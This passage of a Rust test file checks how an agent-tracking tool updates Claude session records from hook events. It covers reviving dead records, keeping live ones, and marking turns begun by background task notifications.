/// record is revived, nothing wiped, but born anew, so its turns are never
/// compared with the old record's.
#[test]
fn a_hook_with_no_session_revives_a_dead_record() {
    let (_d, s) = store();
    let mut old = Agent::new(id_for_pane("claude", "w1:p1"), "claude", at(0));
    old.pane.pane_id = "w1:p1".into();
    old.state = AgentState::Dead;
    old.session_id = "old-session".into();
    old.work_seq = 9;
    s.save(&old).unwrap();

    claude::run(
        &s,
        "stop",
        br#"{"cwd":"/w"}"#.as_slice(),
        env("w1:p1"),
        at(30),
    )
    .unwrap();

    let a = load(&s, "claude", "w1:p1");
    assert_eq!(a.born_at, Some(at(30)));
    assert_eq!(a.session_id, "old-session", "kept, not wiped");
    assert_eq!(a.work_seq, 9, "kept, not wiped");
}

/// A live record is still the same agent: a hook keeps building on it.
#[test]
fn a_hook_over_a_live_record_keeps_it() {
    let (_d, s) = store();
    let mut live = Agent::new(id_for_pane("claude", "w1:p1"), "claude", at(0));
    live.pane.pane_id = "w1:p1".into();
    live.work_seq = 9;
    s.save(&live).unwrap();

    claude::run(
        &s,
        "user-prompt-submit",
        CLAUDE_IN.as_bytes(),
        env("w1:p1"),
        at(30),
    )
    .unwrap();

    let a = load(&s, "claude", "w1:p1");
    assert_eq!(a.born_at, Some(at(0)));
    assert_eq!(a.work_seq, 10);
}

// ---------------------------------------------------------------- background turns

const NOTIFY_IN: &str = r#"{"session_id":"10ec8033-ca55","cwd":"/w/herdr-tower",
    "hook_event_name":"UserPromptSubmit",
    "prompt":"<task-notification>\n<task-id>bynq1hbf5</task-id>\n<status>completed</status>\n</task-notification>"}"#;

const PROMPT_IN: &str = r#"{"session_id":"10ec8033-ca55","cwd":"/w/herdr-tower",
    "hook_event_name":"UserPromptSubmit","prompt":"carry on with the parser"}"#;

/// A turn a background-task notification began is marked, through its tool
/// calls and its stop, and the next real prompt clears the mark — the idle
/// loop reads it to keep its clock.
#[test]
fn a_notification_turn_is_marked_until_the_next_real_prompt() {
    let (_d, s) = store();
    claude::run(
        &s,
        "user-prompt-submit",
        NOTIFY_IN.as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    assert!(load(&s, "claude", "w2:p3").background_turn);
    claude::run(
        &s,
        "post-tool-use",
        CLAUDE_IN.as_bytes(),
        env("w2:p3"),
        at(1),
    )
    .unwrap();
    claude::run(&s, "stop", CLAUDE_IN.as_bytes(), env("w2:p3"), at(2)).unwrap();
    let a = load(&s, "claude", "w2:p3");
    assert!(a.background_turn, "kept through the turn and its settle");
    assert_eq!(a.state, AgentState::DoneUnread);
    claude::run(
        &s,
        "user-prompt-submit",
        PROMPT_IN.as_bytes(),
        env("w2:p3"),
        at(3),
    )
    .unwrap();
    assert!(!load(&s, "claude", "w2:p3").background_turn);
}

/// Only a prompt whose first line is the notification wrapper counts: a
/// person quoting one further down is still a person's prompt.
#[test]
fn a_prompt_merely_mentioning_a_notification_is_ordinary() {
    let (_d, s) = store();
    let quoted = r#"{"session_id":"s","cwd":"/w","prompt":"look at this:\n<task-notification>"}"#;
    claude::run(
        &s,
        "user-prompt-submit",
        quoted.as_bytes(),
        env("w2:p3"),
        at(0),
    )
    .unwrap();
    assert!(!load(&s, "claude", "w2:p3").background_turn);
}

/// The scanner saw the notification's turn start before its hook arrived and
/// counted it as an ordinary turn; the hook, taking that count over, puts the
/// ordinary count back — otherwise every notification would read as a
/// person's turn to the idle loop, the very thing the mark is for.
#[test]
fn a_background_hook_taking_over_an_inferred_turn_restores_the_ordinary_count() {
    let (_d, s) = store();
    let mut a = Agent::new(id_for_pane("claude", "w2:p3"), "claude", at(0));
    a.pane.pane_id = "w2:p3".into();
    a.session_id = "10ec8033-ca55".into();
    a.work_seq = 4;
    a.ordinary_seq = 4;
    a.infer_turn(at(10)); // the scanner: turn 5, origin unknown
    assert_eq!(a.ordinary_seq, 5);
    s.save(&a).unwrap();
    // The hook, within the claim window.
    claude::run(
        &s,
        "user-prompt-submit",
        NOTIFY_IN.as_bytes(),
        env("w2:p3"),
        at(10) + Duration::seconds(2),
    )
    .unwrap();
    let a = load(&s, "claude", "w2:p3");
    assert_eq!(
        a.work_seq, 5,
        "the inferred count was taken over, not doubled"
    );
    assert!(a.background_turn);
    assert_eq!(a.ordinary_seq, 4, "the scanner's guess undone");
    assert_eq!(a.ordinary_before_inference, None);
}

/// An ordinary hook taking the inferred count over keeps it ordinary.
#[test]
fn an_ordinary_hook_taking_over_an_inferred_turn_keeps_it_ordinary() {
    let (_d, s) = store();
    let mut a = Agent::new(id_for_pane("claude", "w2:p3"), "claude", at(0));
    a.pane.pane_id = "w2:p3".into();
    a.session_id = "10ec8033-ca55".into();
    a.work_seq = 4;
    a.ordinary_seq = 4;
    a.infer_turn(at(10));
    s.save(&a).unwrap();
    claude::run(
        &s,
        "user-prompt-submit",
        PROMPT_IN.as_bytes(),
        env("w2:p3"),
        at(10) + Duration::seconds(2),
    )
    .unwrap();
    let a = load(&s, "claude", "w2:p3");
    assert_eq!((a.work_seq, a.ordinary_seq), (5, 5));
}
